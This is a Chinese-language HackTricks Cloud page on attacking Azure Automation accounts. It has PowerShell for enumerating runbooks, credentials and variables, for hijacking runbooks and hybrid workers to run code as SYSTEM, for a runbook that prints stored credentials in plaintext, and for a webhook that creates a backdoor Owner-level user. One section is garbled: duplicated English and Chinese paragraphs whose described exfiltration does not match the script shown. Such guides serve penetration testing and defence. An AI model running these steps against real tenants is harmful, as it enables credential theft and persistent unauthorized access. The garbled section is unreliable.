# Az - 自动化帐户

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 HackTricks 的 PDF，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享您的黑客技巧。**

</details>

## 基本信息

Azure Automation 提供了基于云的自动化、操作系统更新和配置服务，支持在 Azure 和非 Azure 环境中进行一致的管理。它包括流程自动化、配置管理、更新管理、共享功能和异构特性。

这些类似于 Azure 中的 "**定期任务**"，它们允许您执行操作（甚至脚本）来**管理**、检查和配置**Azure 环境**。

### 运行帐户

当使用 **运行帐户** 时，它会创建一个带有自签名证书的 Azure AD **应用程序**，创建一个 **服务主体**，并为该帐户在**当前订阅**中分配 **Contributor** 角色（拥有很多权限）。\
Microsoft 建议使用**托管标识**来管理自动化帐户。

{% hint style="warning" %}
此功能将于 2023 年 9 月 30 日被**移除，并改为使用托管标识**。
{% endhint %}

## 入侵 Runbooks 和 Jobs

**Runbooks** 允许您执行任意的 PowerShell 代码。攻击者可以滥用此功能来窃取**附加主体**（如果有的话）的权限。\
在 **Runbooks** 的代码中，您还可能找到**敏感信息**（例如凭据）。

如果您可以**读取**这些 **jobs**，请尽量这样做，因为它们包含运行的输出（可能包含**敏感信息**）。

转到 `Automation Accounts` --> `<选择自动化帐户>` --> `Runbooks/Jobs/Hybrid worker groups/Watcher tasks/credentials/variables/certificates/connections`

### 混合工作器

Runbook 可以在 Azure 中的**容器内**或**混合工作器**中运行。\
**Log Analytics Agent** 部署在虚拟机上，将其注册为混合工作器。\
混合工作器作业在 Windows 上以 **SYSTEM** 身份运行，在 Linux 上以 **nxautomation** 帐户运行。\
每个混合工作器都注册在一个**混合工作器组**中。

因此，如果您可以选择在**Windows 混合工作器**中运行一个 **Runbook**，您将以**System**身份在该机器上执行**任意命令**。

## 入侵状态配置（SC）

Azure Automation **状态配置**是一项 Azure 配置管理服务，允许您编写、管理和编译 PowerShell Desired State Configuration (DSC) [配置](https://learn.microsoft.com/en-us/powershell/dsc/configurations/configurations)，用于任何云或本地数据中心中的节点。该服务还导入 [DSC 资源](https://learn.microsoft.com/en-us/powershell/dsc/resources/resources)，并将配置分配给目标节点，所有这些都在云中完成。您可以通过在 Azure 门户中选择 **状态配置 (DSC)** 下的 **配置管理** 来访问 Azure Automation 状态配置。

这些配置中可能包含**敏感信息**。

### RCE

可以滥用 SC 来在托管机器上运行任意脚本。

{% content-ref url="az-state-configuration-rce.md" %}
[az-state-configuration-rce.md](az-state-configuration-rce.md)
{% endcontent-ref %}

## 枚举

{% code overflow="wrap" %}
```powershell
# Check user right for automation
az extension add --upgrade -n automation
az automation account list # if it doesn't return anything the user is not a part of an Automation group

# Gets Azure Automation accounts in a resource group
Get-AzAutomationAccount

# List & get DSC configs
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {$_.name -match '<name>'} | Export-AzAutomationDscConfiguration -OutputFolder . -Debug
## Automation Accounts named SecurityBaselineConfigurationWS... are there by default (not interesting)

# List & get Run books code
Get-AzAutomationAccount | Get-AzAutomationRunbook
Get-AzAutomationAccount | Get-AzAutomationRunbook | Export-AzAutomationRunbook -OutputFolder /tmp

# List credentials & variables & others
Get-AzAutomationAccount | Get-AzAutomationCredential
Get-AzAutomationAccount | Get-AzAutomationVariable
Get-AzAutomationAccount | Get-AzAutomationConnection
Get-AzAutomationAccount | Get-AzAutomationCertificate
Get-AzAutomationAccount | Get-AzAutomationSchedule
Get-AzAutomationAccount | Get-AzAutomationModule
Get-AzAutomationAccount | Get-AzAutomationPython3Package
## Exfiltrate credentials & variables and the other info loading them in a Runbook and printing them

# List hybrid workers
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>
```
### 创建一个运行簿

{% code overflow="wrap" %}
```powershell
# Get the role of a user on the Automation account
# Contributor or higher = Can create and execute Runbooks
Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>

# Create a Powershell Runbook
Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose

# Publish the Runbook
Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose

# Start the Runbook
Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
```
{% endcode %}

### 使用运行簿从自动化帐户中窃取凭据和变量

In some cases, you may need to exfiltrate credentials and variables defined in an Azure Automation Account. This can be done by creating a runbook that retrieves and sends this information to an external location.

在某些情况下，您可能需要窃取在Azure自动化帐户中定义的凭据和变量。可以通过创建一个运行簿来获取并将此信息发送到外部位置来实现。

Here is an example of how to accomplish this:

以下是如何实现的示例：

1. Create a new runbook in the Azure Automation Account.

   在Azure自动化帐户中创建一个新的运行簿。

2. Use the following PowerShell script to retrieve the credentials and variables:

   使用以下PowerShell脚本来获取凭据和变量：

   ```powershell
   $connectionName = "AzureRunAsConnection"
   $servicePrincipalConnection = Get-AutomationConnection -Name $connectionName

   $creds = Get-AutomationPSCredential -Name "CredentialName"
   $username = $creds.UserName
   $password = $creds.GetNetworkCredential().Password

   $variables = Get-AutomationVariable

   $data = @{
       "Username" = $username
       "Password" = $password
       "Variables" = $variables
   }

   $data | ConvertTo-Json | Out-File -FilePath "C:\temp\exfiltrated_data.json"
   ```

   Make sure to replace "CredentialName" with the name of the credential you want to exfiltrate.

   确保将"CredentialName"替换为要窃取的凭据的名称。

3. Save the runbook and publish it.

   保存运行簿并发布。

4. Schedule the runbook to run at a specific time or trigger it manually.

   安排运行簿在特定时间运行或手动触发它。

5. Once the runbook has executed, the exfiltrated data will be saved in the specified file location ("C:\temp\exfiltrated_data.json" in this example).

   运行簿执行后，窃取的数据将保存在指定的文件位置（在此示例中为"C:\temp\exfiltrated_data.json"）。

By exfiltrating credentials and variables from an Azure Automation Account, you can gain access to sensitive information that may be useful for further exploitation or analysis.

通过从Azure自动化帐户中窃取凭据和变量，您可以获得对可能有助于进一步利用或分析的敏感信息的访问权限。
```powershell
# Change the crdentials & variables names and add as many as you need
@'
$creds = Get-AutomationPSCredential -Name <credentials_name>
$runbook_variable = Get-AutomationVariable -name <variable_name>
$runbook_variable
$creds.GetNetworkCredential().username
$creds.GetNetworkCredential().password
'@ | out-file -encoding ascii 'runbook_get_creds.ps1'

$ResourceGroupName = '<resource_group_name>'
$AutomationAccountName = '<auto_acc_name>'
$RunBookName = 'Exif-Credentials' #Change this for stealthness

# Creare Run book, publish, start, and get output
New-AzAutomationRunBook -name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell
Import-AzAutomationRunBook -Path 'runbook_get_creds.ps1' -Name $RunBookName -Type PowerShell -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Force
Publish-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
$start = Start-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
start-sleep 20
($start | Get-AzAutomationJob | Get-AzAutomationJobOutput).Summarynt
```
{% hint style="info" %}
您可以通过修改现有的运行簿并从Web控制台执行相同的操作。
{% endhint %}

## 持久性

### 创建具有高特权用户的自动化

* 创建一个新的自动化帐户
* "创建 Azure Run As 帐户"：是
* 导入一个新的运行簿，该运行簿创建一个具有订阅的 Owner 权限的 AzureAD 用户
* 此博客的示例运行簿位于此处 - [https://github.com/NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)
* 发布运行簿
* 向运行簿添加一个 Webhook
* 向自动化帐户添加 AzureAD 模块
* 更新 Azure 自动化模块
* 将 "用户管理员" 和 "订阅所有者" 权限分配给自动化帐户
* 最终失去您的访问权限...
*   使用 POST 请求触发 Webhook 来创建新用户

```powershell
$uri = "https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"
$AccountInfo  = @(@{RequestBody=@{Username="后门用户名";Password="后门密码"}})
$body = ConvertTo-Json -InputObject $AccountInfo
$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
```

## 参考资料

* [https://learn.microsoft.com/en-us/azure/automation/overview](https://learn.microsoft.com/en-us/azure/automation/overview)
* [https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview)
* [https://github.com/rootsecdev/Azure-Red-Team#runbook-automation](https://github.com/rootsecdev/Azure-Red-Team#runbook-automation)

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 PDF 版的 HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享您的黑客技巧。**

</details>
